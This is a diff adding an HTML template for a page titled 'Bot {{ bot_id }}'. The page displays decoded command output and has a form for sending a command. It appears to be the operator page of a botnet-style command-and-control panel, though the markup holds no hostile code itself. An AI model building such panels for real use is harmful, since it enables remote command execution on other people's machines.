@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bot {{ bot_id }}</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #222222;
+            color: #fff;
+        }
+
+        h1 {
+            color: #007bff;
+        }
+
+        .container {
+            margin: 20px;
+        }
+
+        .output, .results {
+            background-color: #333;
+            padding: 10px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+
+        input[type="text"] {
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #333;
+            border-radius: 5px;
+        }
+
+        button {
+            padding: 10px;
+            background-color: #007bff;
+            border: none;
+            color: #fff;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Bot {{ bot_id }}</h1>
+        <h2>Command Output</h2>
+        <div class="output">{{ decoded_data }}</div> <!-- Assuming the 6th column is output -->
+        <form method="post">
+            <input type="text" name="cmd" placeholder="Enter command" required>
+            <button type="submit">Send Command</button>
+        </form>
+    </div>
+</body>
+</html>
